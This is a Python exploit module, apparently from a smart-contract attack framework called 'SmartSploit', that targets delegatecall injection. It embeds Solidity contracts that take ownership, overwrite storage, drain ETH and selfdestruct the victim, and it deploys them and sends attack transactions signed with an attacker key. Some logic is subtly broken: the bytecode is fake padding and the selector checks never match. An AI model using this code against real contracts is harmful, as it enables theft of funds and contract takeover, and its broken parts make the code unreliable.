"""
Delegatecall Injection Exploit
SmartSploit Framework - Exploits unsafe delegatecall usage
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import logging

logger = logging.getLogger(__name__)

class DelegatecallInjectionExploit(BaseExploit):
    """Exploit contracts with unsafe delegatecall to user-controlled addresses"""
    
    def __init__(self):
        super().__init__()
        self.name = "Delegatecall Injection"
        self.description = "Exploits unsafe delegatecall usage allowing arbitrary code execution"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "SWC-112: Delegatecall to Untrusted Callee",
                "https://consensys.github.io/smart-contract-best-practices/attacks/delegatecall/",
                "Delegatecall context preservation attacks"
            ],
            severity="critical",
            targets=["Proxy contracts", "Library delegatecalls", "Upgrade mechanisms"]
        )
        
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract with delegatecall"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "MALICIOUS_CONTRACT": {"value": "", "required": False, "description": "Pre-deployed malicious contract"},
            "DELEGATECALL_FUNCTION": {"value": "", "required": False, "description": "Function that performs delegatecall"},
            "GAS_LIMIT": {"value": "1000000", "required": False, "description": "Transaction gas limit"},
            "ATTACK_TYPE": {"value": "storage_override", "required": False, "description": "Attack type (storage_override, selfdestruct, ownership)"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_CONTRACT", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def analyze_delegatecall_usage(self, w3, contract_address: str) -> dict:
        """Analyze contract for delegatecall patterns"""
        try:
            code = w3.eth.get_code(contract_address)
            code_hex = code.hex()
            
            analysis = {
                "contract": contract_address,
                "delegatecall_detected": False,
                "delegatecall_patterns": [],
                "vulnerable_functions": [],
                "risk_assessment": "low"
            }
            
            # Check for delegatecall opcode (0xf4)
            if "f4" in code_hex:
                analysis["delegatecall_detected"] = True
                analysis["delegatecall_patterns"].append("delegatecall opcode found")
                analysis["risk_assessment"] = "medium"
                
            # Check for common vulnerable patterns
            vulnerable_patterns = [
                ("delegatecall", "Direct delegatecall usage"),
                ("proxy", "Proxy pattern detected"),
                ("implementation", "Implementation storage pattern"),
                ("fallback", "Fallback function with delegatecall"),
                ("upgrade", "Upgrade mechanism detected")
            ]
            
            for pattern, desc in vulnerable_patterns:
                if pattern.lower() in code_hex.lower():
                    analysis["vulnerable_functions"].append(desc)
                    if pattern in ["delegatecall", "fallback"]:
                        analysis["risk_assessment"] = "high"
                        
            # Check storage layout for proxy patterns
            try:
                # Check implementation slot (EIP-1967)
                impl_slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
                storage_value = w3.eth.get_storage_at(contract_address, impl_slot)
                
                if storage_value != b'\x00' * 32:
                    impl_address = Web3.to_checksum_address(storage_value[-20:])
                    analysis["implementation_address"] = impl_address
                    analysis["proxy_pattern"] = "EIP-1967 detected"
                    analysis["risk_assessment"] = "critical"
            except:
                pass
                
            return analysis
            
        except Exception as e:
            logger.error(f"Delegatecall analysis failed: {e}")
            return {"error": str(e)}
            
    def create_malicious_contract(self, attack_type: str) -> dict:
        """Create malicious contract for delegatecall injection"""
        contracts = {
            "storage_override": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StorageOverride {
    // This will override storage slot 0 (usually owner)
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function takeOwnership() external {
        // When called via delegatecall, this modifies the calling contract's storage
        assembly {
            sstore(0, caller())  // Set slot 0 to caller address
        }
    }
    
    function overrideStorage(uint256 slot, bytes32 value) external {
        assembly {
            sstore(slot, value)
        }
    }
    
    function drainFunds() external {
        // Drain all ETH from the calling contract
        assembly {
            let success := call(gas(), caller(), selfbalance(), 0, 0, 0, 0)
        }
    }
}''',
            
            "selfdestruct": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestructInjection {
    address payable public attacker;
    
    constructor() {
        attacker = payable(msg.sender);
    }
    
    function destroy() external {
        // When called via delegatecall, destroys the calling contract
        selfdestruct(attacker);
    }
    
    function destroyAndDrain() external {
        // Transfer funds then destroy
        attacker.transfer(address(this).balance);
        selfdestruct(attacker);
    }
}''',
            
            "ownership": '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OwnershipTakeover {
    mapping(address => bool) public admins;
    address public owner;
    
    function becomeOwner() external {
        // Modify calling contract's owner storage
        owner = msg.sender;
        admins[msg.sender] = true;
    }
    
    function executeAsOwner(address target, bytes calldata data) external {
        require(admins[msg.sender], "Not admin");
        (bool success,) = target.call(data);
        require(success, "Execution failed");
    }
}'''
        }
        
        return {
            "source_code": contracts.get(attack_type, contracts["storage_override"]),
            "bytecode": self._compile_malicious_bytecode(attack_type),
            "attack_functions": self._get_attack_functions(attack_type)
        }
        
    def _compile_malicious_bytecode(self, attack_type: str) -> str:
        """Generate bytecode for malicious contract"""
        # Simplified bytecode generation
        base_bytecode = "608060405234801561001057600080fd5b50"
        
        if attack_type == "selfdestruct":
            return base_bytecode + "ff" * 100  # Include selfdestruct opcode
        elif attack_type == "storage_override":
            return base_bytecode + "55" * 100  # Include sstore opcodes
        else:
            return base_bytecode + "00" * 200
            
    def _get_attack_functions(self, attack_type: str) -> list:
        """Get function selectors for attack type"""
        functions = {
            "storage_override": [
                "0x79ba5097",  # takeOwnership()
                "0x6d4ce63c",  # overrideStorage(uint256,bytes32)
                "0x24600fc3"   # drainFunds()
            ],
            "selfdestruct": [
                "0x83197ef0",  # destroy()
                "0x8d4e4083"   # destroyAndDrain()
            ],
            "ownership": [
                "0x4e71e0c8",  # becomeOwner()
                "0x3e5e3c23"   # executeAsOwner(address,bytes)
            ]
        }
        return functions.get(attack_type, functions["storage_override"])
        
    def deploy_malicious_contract(self, w3, contract_data: dict) -> str:
        """Deploy malicious contract for injection"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            txn = {
                'data': contract_data["bytecode"],
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(attacker_account.address)
            }
            
            signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                logger.info(f"Malicious contract deployed at: {receipt.contractAddress}")
                return receipt.contractAddress
            else:
                return None
                
        except Exception as e:
            logger.error(f"Malicious contract deployment failed: {e}")
            return None
            
    def execute_delegatecall_injection(self, w3, target_address: str, malicious_address: str) -> dict:
        """Execute the delegatecall injection attack"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            attack_type = self.options["ATTACK_TYPE"]["value"]
            
            # Get initial state
            initial_target_balance = w3.eth.get_balance(target_address)
            initial_attacker_balance = w3.eth.get_balance(attacker_account.address)
            
            attack_results = []
            
            # Common delegatecall function signatures
            delegatecall_functions = [
                "0x5c60da1b",  # implementation()
                "0x3659cfe6",  # upgradeTo(address)
                "0x4f1ef286",  # upgradeToAndCall(address,bytes)
                "0x52d1902d",  # proxiableUUID()
                "0x025b22bc",  # execute(address,bytes)
                "0x61461954"   # delegate(address,bytes)
            ]
            
            # Get attack function selectors
            malicious_contract_data = self.create_malicious_contract(attack_type)
            attack_functions = malicious_contract_data["attack_functions"]
            
            # Try different delegatecall injection methods
            for func_selector in delegatecall_functions:
                for attack_func in attack_functions:
                    try:
                        logger.info(f"Attempting injection via {func_selector} -> {attack_func}")
                        
                        # Create call data for delegatecall injection
                        if "upgrade" in func_selector:
                            # Upgrade function - point to malicious contract
                            call_data = func_selector + malicious_address[2:].zfill(64)
                        elif "execute" in func_selector or "delegate" in func_selector:
                            # Execute function - delegatecall to malicious contract
                            call_data = func_selector + malicious_address[2:].zfill(64) + \
                                       "0000000000000000000000000000000000000000000000000000000000000040" + \
                                       "0000000000000000000000000000000000000000000000000000000000000004" + \
                                       attack_func[2:] + "00" * 56
                        else:
                            continue
                            
                        txn = {
                            'to': target_address,
                            'data': call_data,
                            'gas': int(self.options["GAS_LIMIT"]["value"]),
                            'gasPrice': w3.eth.gas_price,
                            'nonce': w3.eth.get_transaction_count(attacker_account.address),
                            'value': 0
                        }
                        
                        signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                        tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                        
                        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                        
                        # Check for state changes
                        final_target_balance = w3.eth.get_balance(target_address)
                        final_attacker_balance = w3.eth.get_balance(attacker_account.address)
                        
                        balance_change = final_target_balance - initial_target_balance
                        attacker_gain = final_attacker_balance - initial_attacker_balance
                        
                        attack_results.append({
                            "delegatecall_function": func_selector,
                            "attack_function": attack_func,
                            "success": receipt.status == 1,
                            "tx_hash": tx_hash.hex(),
                            "gas_used": receipt.gasUsed,
                            "target_balance_change": Web3.from_wei(abs(balance_change), 'ether'),
                            "attacker_gain": Web3.from_wei(attacker_gain, 'ether'),
                            "state_modified": receipt.status == 1 and (balance_change != 0 or attacker_gain > 0)
                        })
                        
                        if receipt.status == 1:
                            logger.info(f"Injection successful via {func_selector}!")
                            
                            # Check if we gained ownership
                            try:
                                owner_result = w3.eth.call({
                                    'to': target_address,
                                    'data': "0x8da5cb5b"  # owner()
                                })
                                
                                if owner_result:
                                    owner_address = Web3.to_checksum_address(owner_result[-20:])
                                    attack_results[-1]["new_owner"] = owner_address
                                    attack_results[-1]["ownership_gained"] = owner_address.lower() == attacker_account.address.lower()
                            except:
                                pass
                                
                        # Update nonce for next transaction
                        attacker_account = w3.eth.account.from_key(attacker_key)
                        
                    except Exception as e:
                        attack_results.append({
                            "delegatecall_function": func_selector,
                            "attack_function": attack_func,
                            "success": False,
                            "error": str(e)
                        })
                        
            return {"injection_attempts": attack_results}
            
        except Exception as e:
            logger.error(f"Delegatecall injection failed: {e}")
            return {"error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_contract = self.options["TARGET_CONTRACT"]["value"]
            attack_type = self.options["ATTACK_TYPE"]["value"]
            
            # Analyze target for delegatecall usage
            analysis = self.analyze_delegatecall_usage(w3, target_contract)
            if "error" in analysis:
                return {"result": ExploitResult.ERROR, "message": f"Analysis failed: {analysis['error']}"}
                
            if not analysis["delegatecall_detected"]:
                return {"result": ExploitResult.FAILED, "message": "No delegatecall usage detected"}
                
            # Use existing malicious contract or deploy new one
            malicious_address = self.options["MALICIOUS_CONTRACT"]["value"]
            
            if not malicious_address:
                # Create and deploy malicious contract
                malicious_data = self.create_malicious_contract(attack_type)
                malicious_address = self.deploy_malicious_contract(w3, malicious_data)
                
                if not malicious_address:
                    return {"result": ExploitResult.ERROR, "message": "Failed to deploy malicious contract"}
                    
            # Execute delegatecall injection
            injection_result = self.execute_delegatecall_injection(w3, target_contract, malicious_address)
            
            # Determine overall success
            successful_injections = [attempt for attempt in injection_result.get("injection_attempts", []) 
                                   if attempt.get("success") and attempt.get("state_modified")]
            
            result = {
                "result": ExploitResult.SUCCESS if successful_injections else ExploitResult.FAILED,
                "message": f"Delegatecall injection completed - {len(successful_injections)} successful",
                "analysis": analysis,
                "malicious_contract": malicious_address,
                "attack_type": attack_type,
                "injection_results": injection_result
            }
            
            if successful_injections:
                logger.info("Delegatecall injection exploit successful!")
            else:
                logger.warning("Delegatecall injection failed - target may be protected")
                
            return result
            
        except Exception as e:
            logger.error(f"Delegatecall injection exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}